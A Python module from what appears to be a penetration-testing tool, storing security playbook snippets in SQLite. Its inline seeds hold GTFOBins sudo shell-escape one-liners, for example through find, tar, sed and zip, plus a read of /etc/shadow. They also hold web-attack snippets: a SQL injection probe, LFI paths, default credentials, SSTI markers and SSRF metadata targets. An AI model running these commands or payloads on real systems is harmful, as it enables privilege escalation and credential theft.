"""KnowledgeBase — curated security playbook snippets persisted in SQLite.

Extends :class:`~huntersec.memory.store.MemoryStore` semantics with a
``category`` column to support topical lookup ("gtfobins", "web_vulns").

The seed data ships in :mod:`configs.knowledge.gtfobins_seed.yaml` and is
inlined here as a fallback so the module works without the YAML file
(important for editable installs / smoke tests).
"""

from __future__ import annotations

import sqlite3
from datetime import UTC, datetime
from pathlib import Path
from typing import TypedDict

import structlog

log: structlog.stdlib.BoundLogger = structlog.get_logger(__name__)


class KnowledgeSnippet(TypedDict):
    """One entry in the knowledge base."""

    id: int
    category: str
    title: str
    content: str
    source: str


_SCHEMA = """\
CREATE TABLE IF NOT EXISTS kb_snippets (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    category    TEXT NOT NULL,
    title       TEXT NOT NULL,
    content     TEXT NOT NULL,
    source      TEXT NOT NULL DEFAULT '',
    created_at  TEXT NOT NULL,
    UNIQUE(category, title)
);

CREATE INDEX IF NOT EXISTS idx_kb_category ON kb_snippets(category);
"""


# Fallback seeds — top-20 GTFOBins entries (subset).  When the YAML file
# in configs/knowledge/ is present, it overrides these.
_GTFOBINS_INLINE_SEED: list[dict[str, str]] = [
    {
        "title": "bash — sudo shell",
        "content": "sudo bash → drops root shell directly.",
        "source": "gtfobins:bash",
    },
    {
        "title": "vim — shell escape",
        "content": ":!sh inside vim spawns a shell with vim's privileges.",
        "source": "gtfobins:vim",
    },
    {
        "title": "python — sudo shell",
        "content": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
        "source": "gtfobins:python",
    },
    {
        "title": "find — exec shell",
        "content": "sudo find . -exec /bin/sh \\; -quit",
        "source": "gtfobins:find",
    },
    {
        "title": "tar — checkpoint action",
        "content": "tar --checkpoint=1 --checkpoint-action=exec=/bin/sh /etc/passwd",
        "source": "gtfobins:tar",
    },
    {
        "title": "less — shell escape",
        "content": "Inside less press `!sh` to spawn a shell.",
        "source": "gtfobins:less",
    },
    {
        "title": "more — shell escape",
        "content": "On small terminals `!sh` inside more spawns a shell.",
        "source": "gtfobins:more",
    },
    {
        "title": "awk — system call",
        "content": "awk 'BEGIN {system(\"/bin/sh\")}'",
        "source": "gtfobins:awk",
    },
    {
        "title": "nmap — interactive mode",
        "content": "nmap --interactive then `!sh` (legacy versions).",
        "source": "gtfobins:nmap",
    },
    {
        "title": "perl — sudo shell",
        "content": "sudo perl -e 'exec \"/bin/sh\";'",
        "source": "gtfobins:perl",
    },
    {
        "title": "ruby — sudo shell",
        "content": "sudo ruby -e 'exec \"/bin/sh\"'",
        "source": "gtfobins:ruby",
    },
    {
        "title": "sed — shell escape",
        "content": "sudo sed -n '1e exec sh 1>&0' /etc/hostname",
        "source": "gtfobins:sed",
    },
    {
        "title": "env — sudo shell",
        "content": "sudo env /bin/sh",
        "source": "gtfobins:env",
    },
    {
        "title": "ftp — shell escape",
        "content": "Inside ftp prompt: `!sh`",
        "source": "gtfobins:ftp",
    },
    {
        "title": "git — pager shell",
        "content": "git -p help → press `!sh` while in the pager.",
        "source": "gtfobins:git",
    },
    {
        "title": "man — pager shell",
        "content": "man <page> then `!sh` in the pager (less).",
        "source": "gtfobins:man",
    },
    {
        "title": "tcpdump — postrotate hook",
        "content": "tcpdump -ln -i any -w/dev/null -W1 -G1 -z /bin/sh",
        "source": "gtfobins:tcpdump",
    },
    {
        "title": "zip — TT shell escape",
        "content": "sudo zip /tmp/x.zip /etc/hosts -T -TT 'sh #'",
        "source": "gtfobins:zip",
    },
    {
        "title": "xxd — read file as root",
        "content": "sudo xxd /etc/shadow | xxd -r → arbitrary file read.",
        "source": "gtfobins:xxd",
    },
    {
        "title": "cp — overwrite as root",
        "content": "sudo cp /etc/passwd /tmp/x → arbitrary file read via copy.",
        "source": "gtfobins:cp",
    },
]


_COMMON_VULNS_INLINE_SEED: list[dict[str, str]] = [
    {
        "title": "SQLi — UNION-based detection",
        "content": "Probe with `' UNION SELECT NULL-- -` and grow columns. "
        "Watch for differential responses on injectable params.",
        "source": "playbook:web",
    },
    {
        "title": "LFI — common paths",
        "content": "/etc/passwd, /etc/hosts, /proc/self/environ, "
        "../../../../etc/passwd, php://filter/convert.base64-encode/resource=index.php",
        "source": "playbook:web",
    },
    {
        "title": "Default creds — common pairs",
        "content": "admin:admin, root:root, tomcat:tomcat, "
        "admin:password, postgres:postgres, oracle:oracle, jenkins:jenkins.",
        "source": "playbook:web",
    },
    {
        "title": "SSTI — Jinja2 marker",
        "content": "{{7*7}} → 49 indicates Jinja2; {{config}} dumps app config.",
        "source": "playbook:web",
    },
    {
        "title": "SSRF — internal targets",
        "content": "169.254.169.254 (cloud metadata), 127.0.0.1, localhost, file:///etc/passwd.",
        "source": "playbook:web",
    },
]


class KnowledgeBase:
    """SQLite-backed knowledge base for offensive playbook snippets.

    Args:
        db_path: SQLite path; use ``":memory:"`` in tests.

    Example:
        >>> kb = KnowledgeBase(":memory:")
        >>> kb.seed_gtfobins()
        >>> hits = kb.search("sudo bash", category="gtfobins")
        >>> any("bash" in s["title"].lower() for s in hits)
        True
    """

    def __init__(self, db_path: Path | str = ":memory:") -> None:
        self._conn = sqlite3.connect(str(db_path), check_same_thread=False)
        self._conn.row_factory = sqlite3.Row
        self._conn.executescript(_SCHEMA)
        self._conn.commit()

    # ── Seeding ──────────────────────────────────────────────────────────────

    def seed_gtfobins(self, yaml_path: Path | None = None) -> int:
        """Load GTFOBins snippets, optionally from a YAML file.

        Args:
            yaml_path: Optional override for the seed YAML.  Defaults to
                ``configs/knowledge/gtfobins_seed.yaml`` if present.

        Returns:
            Number of new rows inserted (skips duplicates by ``UNIQUE``).
        """
        records = self._load_yaml_or_default(
            yaml_path, "configs/knowledge/gtfobins_seed.yaml", _GTFOBINS_INLINE_SEED
        )
        return self._insert_records("gtfobins", records)

    def seed_common_vulns(self, yaml_path: Path | None = None) -> int:
        """Load common web-vuln cheat-sheet snippets.

        Args:
            yaml_path: Optional override for the seed YAML.

        Returns:
            Number of new rows inserted.
        """
        records = self._load_yaml_or_default(
            yaml_path, "configs/knowledge/common_vulns_seed.yaml", _COMMON_VULNS_INLINE_SEED
        )
        return self._insert_records("web_vulns", records)

    @staticmethod
    def _load_yaml_or_default(
        yaml_path: Path | None,
        default_relative: str,
        inline_seed: list[dict[str, str]],
    ) -> list[dict[str, str]]:
        path = yaml_path or Path(default_relative)
        if not path.exists():
            return inline_seed
        try:
            import yaml

            data = yaml.safe_load(path.read_text(encoding="utf-8"))
        except Exception as exc:  # noqa: BLE001
            log.warning("kb.seed_yaml.failed", path=str(path), reason=str(exc))
            return inline_seed

        if isinstance(data, list):
            return [r for r in data if isinstance(r, dict)]
        if isinstance(data, dict) and "entries" in data:
            entries = data["entries"]
            if isinstance(entries, list):
                return [r for r in entries if isinstance(r, dict)]
        return inline_seed

    def _insert_records(self, category: str, records: list[dict[str, str]]) -> int:
        now = datetime.now(UTC).isoformat()
        inserted = 0
        for rec in records:
            title = str(rec.get("title", "")).strip()
            content = str(rec.get("content", "")).strip()
            source = str(rec.get("source", "")).strip()
            if not title or not content:
                continue
            cur = self._conn.execute(
                "INSERT OR IGNORE INTO kb_snippets"
                "(category, title, content, source, created_at) VALUES(?,?,?,?,?)",
                (category, title, content, source, now),
            )
            if cur.rowcount > 0:
                inserted += 1
        self._conn.commit()
        return inserted

    # ── Query ────────────────────────────────────────────────────────────────

    def search(
        self,
        query: str,
        category: str | None = None,
        limit: int = 10,
    ) -> list[KnowledgeSnippet]:
        """LIKE search across title / content, optionally scoped by category.

        Args:
            query: Search string (case-insensitive substring match).
            category: Optional filter (e.g. ``"gtfobins"``).
            limit: Maximum results.

        Returns:
            List of :class:`KnowledgeSnippet`.
        """
        pattern = f"%{query}%"
        if category:
            rows = self._conn.execute(
                "SELECT id, category, title, content, source FROM kb_snippets "
                "WHERE category = ? AND (title LIKE ? OR content LIKE ?) "
                "ORDER BY id LIMIT ?",
                (category, pattern, pattern, limit),
            ).fetchall()
        else:
            rows = self._conn.execute(
                "SELECT id, category, title, content, source FROM kb_snippets "
                "WHERE title LIKE ? OR content LIKE ? "
                "ORDER BY id LIMIT ?",
                (pattern, pattern, limit),
            ).fetchall()
        return [
            KnowledgeSnippet(
                id=r["id"],
                category=r["category"],
                title=r["title"],
                content=r["content"],
                source=r["source"],
            )
            for r in rows
        ]

    def count(self, category: str | None = None) -> int:
        """Return the number of snippets stored (optionally per category)."""
        if category:
            row = self._conn.execute(
                "SELECT COUNT(*) AS c FROM kb_snippets WHERE category = ?",
                (category,),
            ).fetchone()
        else:
            row = self._conn.execute("SELECT COUNT(*) AS c FROM kb_snippets").fetchone()
        return int(row["c"]) if row else 0

    def close(self) -> None:
        """Close underlying SQLite connection."""
        self._conn.close()
